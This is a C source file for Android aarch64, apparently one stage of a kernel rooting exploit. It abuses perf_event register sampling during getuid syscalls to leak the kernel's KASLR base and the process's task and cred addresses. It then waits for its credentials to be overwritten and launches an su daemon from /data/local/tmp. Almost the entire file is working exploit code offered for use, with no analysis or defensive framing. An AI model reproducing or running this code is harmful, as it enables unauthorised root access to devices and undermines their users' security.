// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 yoyicue

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/perf_event.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "perf_profile.h"

/*
 * Native replacement for PerfKaslr.java + PerfRegsLeak.java.
 *
 * This program deliberately stays alive after sampling.  The host-side C
 * orchestrator writes this process's cred, then this same process launches
 * the embedded su client while it still owns the modified credentials.
 *
 * Kernel instruction offsets are supplied by perf_profile.h for the selected
 * device profile.
 */
#define KASLR_ALIGN             UINT64_C(0x00200000)
#define KASLR_MASK              (KASLR_ALIGN - 1)

#define PAGE_BYTES              4096U
#define DATA_PAGES              64U
#define RING_BYTES              ((1U + DATA_PAGES) * PAGE_BYTES)
#define PERF_ATTR_BYTES         128U
#define ARM64_REG_COUNT         33U
#define ARM64_REG_MASK          ((UINT64_C(1) << ARM64_REG_COUNT) - 1)
#define MAX_SAMPLES             8192U
#define MAX_BASES               32U
#define MAX_POINTERS            128U
#define PERF_CONTEXT_MAX        UINT64_C(0xfffffffffffff001)

#define SU_PATH                 "/data/local/tmp/su"
#define SU_SOCKET               "/data/local/tmp/temp_su.sock"

struct sampled_regs {
  uint64_t ip;
  uint64_t x8;
};

struct base_vote {
  uint64_t base;
  unsigned known_hits;
  unsigned generic_hits;
  unsigned getuid_hits;
};

struct pointer_vote {
  uint64_t pointer;
  unsigned hits;
};

static volatile sig_atomic_t stop_requested;

static void on_signal(int signo) {
  (void)signo;
  stop_requested = 1;
}

static uint64_t monotonic_ms(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
    return 0;
  }
  return (uint64_t)ts.tv_sec * 1000U + (uint64_t)ts.tv_nsec / 1000000U;
}

#if defined(__aarch64__)
static inline long raw_syscall0(long number) {
  register long x8 __asm__("x8") = number;
  register long x0 __asm__("x0");
  __asm__ volatile("svc #0" : "=r"(x0) : "r"(x8) : "memory", "cc");
  return x0;
}
#else
#error "ionstack_perf_target must be built for Android aarch64"
#endif

static bool is_kernel_pointer(uint64_t value) {
  if (value >= PERF_CONTEXT_MAX) {
    return false;
  }
  return (value >> 40) == UINT64_C(0xffffff);
}

static long perf_event_open_local(struct perf_event_attr *attr) {
  return syscall(__NR_perf_event_open, attr, 0, -1, -1,
                 PERF_FLAG_FD_CLOEXEC);
}

static void ring_copy(void *dst, const unsigned char *data, size_t data_size,
                      uint64_t pos, size_t len) {
  size_t off = (size_t)(pos % data_size);
  size_t first = data_size - off;
  if (first > len) {
    first = len;
  }
  memcpy(dst, data + off, first);
  if (first < len) {
    memcpy((unsigned char *)dst + first, data, len - first);
  }
}

static int add_base_vote(struct base_vote *votes, size_t *count,
                         uint64_t base, bool generic) {
  for (size_t i = 0; i < *count; ++i) {
    if (votes[i].base == base) {
      votes[i].known_hits++;
      if (generic) {
        votes[i].generic_hits++;
      } else {
        votes[i].getuid_hits++;
      }
      return 0;
    }
  }
  if (*count >= MAX_BASES) {
    return -1;
  }
  votes[*count].base = base;
  votes[*count].known_hits = 1;
  votes[*count].generic_hits = generic ? 1U : 0U;
  votes[*count].getuid_hits = generic ? 0U : 1U;
  (*count)++;
  return 0;
}

static int add_pointer_vote(struct pointer_vote *votes, size_t *count,
                            uint64_t pointer) {
  for (size_t i = 0; i < *count; ++i) {
    if (votes[i].pointer == pointer) {
      votes[i].hits++;
      return 0;
    }
  }
  if (*count >= MAX_POINTERS) {
    return -1;
  }
  votes[*count].pointer = pointer;
  votes[*count].hits = 1;
  (*count)++;
  return 0;
}

static uint64_t candidate_base_for_ip(uint64_t ip) {
  uint64_t residue = (ip - STATIC_KIMAGE_TEXT_BASE) & KASLR_MASK;
  return ip - residue;
}

static bool known_getuid_ip_offset(uint64_t off, bool *generic) {
  if (off == GETUID_GENERIC_IP_OFF) {
    *generic = true;
    return true;
  }
  if (off >= GETUID_FIRST_OFF && off <= GETUID_LAST_OFF &&
      (off & 3U) == 0) {
    *generic = false;
    return true;
  }
  return false;
}

static int select_leaks(const struct sampled_regs *samples, size_t count,
                        uint64_t *base_out, unsigned *base_hits_out,
                        uint64_t *task_out, unsigned *task_hits_out,
                        uint64_t *cred_out, unsigned *cred_hits_out) {
  struct base_vote bases[MAX_BASES];
  size_t base_count = 0;
  memset(bases, 0, sizeof(bases));

  for (size_t i = 0; i < count; ++i) {
    uint64_t ip = samples[i].ip;
    if (!is_kernel_pointer(ip)) {
      continue;
    }
    uint64_t base = candidate_base_for_ip(ip);
    uint64_t off = ip - base;
    bool generic = false;
    if (known_getuid_ip_offset(off, &generic)) {
      add_base_vote(bases, &base_count, base, generic);
    }
  }

  size_t best = SIZE_MAX;
  for (size_t i = 0; i < base_count; ++i) {
    if (best == SIZE_MAX || bases[i].known_hits > bases[best].known_hits ||
        (bases[i].known_hits == bases[best].known_hits &&
         bases[i].getuid_hits > bases[best].getuid_hits)) {
      best = i;
    }
  }
  if (best == SIZE_MAX || bases[best].known_hits < 2 ||
      bases[best].getuid_hits == 0) {
    return -1;
  }

  uint64_t base = bases[best].base;
  uint64_t slide = base - STATIC_KIMAGE_TEXT_BASE;
  if ((slide & KASLR_MASK) != 0 || !is_kernel_pointer(base)) {
    return -1;
  }

  struct pointer_vote task_votes[MAX_POINTERS];
  struct pointer_vote cred_votes[MAX_POINTERS];
  size_t task_count = 0;
  size_t cred_count = 0;
  memset(task_votes, 0, sizeof(task_votes));
  memset(cred_votes, 0, sizeof(cred_votes));

  for (size_t i = 0; i < count; ++i) {
    if (!is_kernel_pointer(samples[i].x8) || samples[i].ip < base) {
      continue;
    }
    uint64_t off = samples[i].ip - base;
    if (off == GETUID_TASK_IP_OFF) {
      add_pointer_vote(task_votes, &task_count, samples[i].x8);
    }
    if (off >= GETUID_CRED_FIRST_OFF && off <= GETUID_CRED_LAST_OFF) {
      add_pointer_vote(cred_votes, &cred_count, samples[i].x8);
    }
  }

  size_t best_task = SIZE_MAX;
  size_t best_cred = SIZE_MAX;
  for (size_t i = 0; i < task_count; ++i) {
    if (best_task == SIZE_MAX || task_votes[i].hits > task_votes[best_task].hits) {
      best_task = i;
    }
  }
  for (size_t i = 0; i < cred_count; ++i) {
    if (best_cred == SIZE_MAX || cred_votes[i].hits > cred_votes[best_cred].hits) {
      best_cred = i;
    }
  }
  if (best_cred == SIZE_MAX) {
    return -1;
  }

  *base_out = base;
  *base_hits_out = bases[best].known_hits;
  *task_out = best_task == SIZE_MAX ? 0 : task_votes[best_task].pointer;
  *task_hits_out = best_task == SIZE_MAX ? 0 : task_votes[best_task].hits;
  *cred_out = cred_votes[best_cred].pointer;
  *cred_hits_out = cred_votes[best_cred].hits;
  return 0;
}

static int collect_once(unsigned sample_ms, unsigned sample_freq,
                        struct sampled_regs *samples, size_t capacity,
                        size_t *count_out, uint64_t *calls_out) {
  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_SOFTWARE;
  attr.size = PERF_ATTR_BYTES;
  attr.config = PERF_COUNT_SW_CPU_CLOCK;
  attr.sample_freq = sample_freq;
  attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  attr.exclude_user = 1;
  attr.mmap = 1;
  attr.freq = 1;
  attr.wakeup_events = 1;
  attr.sample_regs_intr = ARM64_REG_MASK;

  int fd = (int)perf_event_open_local(&attr);
  if (fd < 0) {
    fprintf(stderr, "[perf-target] perf_event_open failed errno=%d (%s)\n",
            errno, strerror(errno));
    return -1;
  }

  void *mapping = mmap(NULL, RING_BYTES, PROT_READ | PROT_WRITE, MAP_SHARED,
                       fd, 0);
  if (mapping == MAP_FAILED) {
    fprintf(stderr, "[perf-target] perf mmap failed errno=%d (%s)\n", errno,
            strerror(errno));
    close(fd);
    return -1;
  }

  struct perf_event_mmap_page *meta = mapping;
  size_t data_offset = meta->data_offset ? (size_t)meta->data_offset : PAGE_BYTES;
  size_t data_size = meta->data_size ? (size_t)meta->data_size
                                     : DATA_PAGES * PAGE_BYTES;
  if (data_offset + data_size > RING_BYTES || data_size == 0) {
    fprintf(stderr,
            "[perf-target] invalid perf ring data_offset=%zu data_size=%zu\n",
            data_offset, data_size);
    munmap(mapping, RING_BYTES);
    close(fd);
    return -1;
  }
  unsigned char *data = (unsigned char *)mapping + data_offset;

  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  if (ioctl(fd, PERF_EVENT_IOC_ENABLE, 0) != 0) {
    fprintf(stderr, "[perf-target] perf enable failed errno=%d (%s)\n", errno,
            strerror(errno));
    munmap(mapping, RING_BYTES);
    close(fd);
    return -1;
  }

  uint64_t deadline = monotonic_ms() + sample_ms;
  uint64_t calls = 0;
  do {
    for (unsigned i = 0; i < 4096; ++i) {
      (void)raw_syscall0(__NR_getuid);
    }
    calls += 4096;
  } while (!stop_requested && monotonic_ms() < deadline);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  uint64_t head = __atomic_load_n(&meta->data_head, __ATOMIC_ACQUIRE);
  uint64_t tail = meta->data_tail;
  if (head - tail > data_size) {
    tail = head - data_size;
  }

  size_t count = 0;
  unsigned char record[2048];
  while (tail < head) {
    struct perf_event_header header;
    ring_copy(&header, data, data_size, tail, sizeof(header));
    if (header.size < sizeof(header) || header.size > sizeof(record)) {
      break;
    }
    ring_copy(record, data, data_size, tail, header.size);
    if (header.type == PERF_RECORD_SAMPLE &&
        header.size >= sizeof(header) + sizeof(uint64_t) * (2 + ARM64_REG_COUNT)) {
      const unsigned char *cursor = record + sizeof(header);
      uint64_t ip;
      uint64_t abi;
      memcpy(&ip, cursor, sizeof(ip));
      cursor += sizeof(ip);
      memcpy(&abi, cursor, sizeof(abi));
      cursor += sizeof(abi);
      if (abi == PERF_SAMPLE_REGS_ABI_64 && count < capacity) {
        uint64_t x8;
        memcpy(&x8, cursor + 8U * sizeof(uint64_t), sizeof(x8));
        samples[count].ip = ip;
        samples[count].x8 = x8;
        count++;
      }
    }
    tail += header.size;
  }
  __atomic_store_n(&meta->data_tail, head, __ATOMIC_RELEASE);

  munmap(mapping, RING_BYTES);
  close(fd);
  *count_out = count;
  *calls_out = calls;
  return 0;
}

static int launch_su_daemon(void) {
  pid_t child = fork();
  if (child < 0) {
    return -1;
  }
  if (child == 0) {
    execl(SU_PATH, "su", "--daemonize", (char *)NULL);
    _exit(127);
  }
  int status = 0;
  while (waitpid(child, &status, 0) < 0 && errno == EINTR) {
  }
  if (!WIFEXITED(status)) {
    return -1;
  }
  return WEXITSTATUS(status);
}

static int watch_for_root(unsigned hold_sec) {
  uint64_t deadline = monotonic_ms() + (uint64_t)hold_sec * 1000U;
  printf("[perf-target] WATCH pid=%d hold_sec=%u uid=%ld euid=%ld gid=%ld "
         "egid=%ld\n",
         getpid(), hold_sec, raw_syscall0(__NR_getuid),
         raw_syscall0(__NR_geteuid), raw_syscall0(__NR_getgid),
         raw_syscall0(__NR_getegid));

  while (!stop_requested && monotonic_ms() < deadline) {
    long uid = raw_syscall0(__NR_getuid);
    long euid = raw_syscall0(__NR_geteuid);
    long gid = raw_syscall0(__NR_getgid);
    long egid = raw_syscall0(__NR_getegid);
    if (uid == 0 && euid == 0 && gid == 0 && egid == 0) {
      printf("[perf-target] ROOT uid=%ld euid=%ld gid=%ld egid=%ld\n", uid,
             euid, gid, egid);
      int rc = launch_su_daemon();
      printf("[perf-target] DAEMON launch_rc=%d\n", rc);
      uint64_t socket_deadline = monotonic_ms() + 15000U;
      while (!stop_requested && monotonic_ms() < socket_deadline) {
        if (access(SU_SOCKET, F_OK) == 0) {
          printf("[perf-target] ROOT_READY socket=%s\n", SU_SOCKET);
          return 0;
        }
        struct timespec delay = {.tv_sec = 0, .tv_nsec = 25000000};
        nanosleep(&delay, NULL);
      }
      fprintf(stderr, "[perf-target] su socket timeout path=%s\n", SU_SOCKET);
      return -1;
    }
    struct timespec delay = {.tv_sec = 0, .tv_nsec = 10000000};
    nanosleep(&delay, NULL);
  }
  fprintf(stderr, "[perf-target] root watch timeout\n");
  return -1;
}

static unsigned parse_u32(const char *text, const char *name) {
  char *end = NULL;
  errno = 0;
  unsigned long value = strtoul(text, &end, 0);
  if (errno != 0 || !end || *end != '\0' || value > UINT32_MAX) {
    fprintf(stderr, "invalid %s: %s\n", name, text);
    exit(2);
  }
  return (unsigned)value;
}

static void usage(const char *program) {
  fprintf(stderr,
          "usage: %s [--sample-ms=N] [--freq=N] [--attempts=N] "
          "[--hold-sec=N]\n",
          program);
}

int main(int argc, char **argv) {
  unsigned sample_ms = 2500;
  unsigned sample_freq = 4000;
  unsigned attempts = 8;
  unsigned hold_sec = 900;
  for (int i = 1; i < argc; ++i) {
    if (strncmp(argv[i], "--sample-ms=", 12) == 0) {
      sample_ms = parse_u32(argv[i] + 12, "sample-ms");
    } else if (strncmp(argv[i], "--freq=", 7) == 0) {
      sample_freq = parse_u32(argv[i] + 7, "freq");
    } else if (strncmp(argv[i], "--attempts=", 11) == 0) {
      attempts = parse_u32(argv[i] + 11, "attempts");
    } else if (strncmp(argv[i], "--hold-sec=", 11) == 0) {
      hold_sec = parse_u32(argv[i] + 11, "hold-sec");
    } else if (strcmp(argv[i], "--help") == 0) {
      usage(argv[0]);
      return 0;
    } else {
      usage(argv[0]);
      return 2;
    }
  }
  if (sample_ms == 0 || sample_freq == 0 || attempts == 0 || hold_sec == 0) {
    usage(argv[0]);
    return 2;
  }

  setvbuf(stdout, NULL, _IOLBF, 0);
  setvbuf(stderr, NULL, _IOLBF, 0);
  signal(SIGINT, on_signal);
  signal(SIGTERM, on_signal);
  signal(SIGHUP, on_signal);

  printf("[perf-target] START pid=%d sample_ms=%u freq=%u attempts=%u "
         "hold_sec=%u\n",
         getpid(), sample_ms, sample_freq, attempts, hold_sec);

  struct sampled_regs *all_samples =
      calloc(MAX_SAMPLES, sizeof(*all_samples));
  if (!all_samples) {
    perror("calloc samples");
    return 1;
  }
  size_t total = 0;
  uint64_t base = 0;
  uint64_t task = 0;
  uint64_t cred = 0;
  unsigned base_hits = 0;
  unsigned task_hits = 0;
  unsigned cred_hits = 0;

  for (unsigned attempt = 1; attempt <= attempts && !stop_requested; ++attempt) {
    struct sampled_regs batch[MAX_SAMPLES];
    size_t batch_count = 0;
    uint64_t calls = 0;
    int rc = collect_once(sample_ms, sample_freq, batch, MAX_SAMPLES,
                          &batch_count, &calls);
    printf("[perf-target] SAMPLE attempt=%u/%u rc=%d calls=%" PRIu64
           " samples=%zu\n",
           attempt, attempts, rc, calls, batch_count);
    if (rc != 0) {
      free(all_samples);
      return 1;
    }
    size_t room = MAX_SAMPLES - total;
    size_t append = batch_count < room ? batch_count : room;
    memcpy(all_samples + total, batch, append * sizeof(*batch));
    total += append;

    if (select_leaks(all_samples, total, &base, &base_hits, &task,
                     &task_hits, &cred, &cred_hits) == 0 && cred_hits >= 2) {
      break;
    }
    if (total == MAX_SAMPLES) {
      total = 0;
    }
  }

  if (base == 0 || cred == 0) {
    fprintf(stderr,
            "[perf-target] LEAK_FAIL samples=%zu base=0x%016" PRIx64
            " cred=0x%016" PRIx64 "\n",
            total, base, cred);
    free(all_samples);
    return 1;
  }
  free(all_samples);

  printf("[perf-target] READY pid=%d kaslr_base=0x%016" PRIx64
         " task=0x%016" PRIx64 " task_hits=%u cred=0x%016" PRIx64
         " cred_hits=%u base_hits=%u samples=%zu\n",
         getpid(), base, task, task_hits, cred, cred_hits, base_hits, total);
  return watch_for_root(hold_sec) == 0 ? 0 : 1;
}
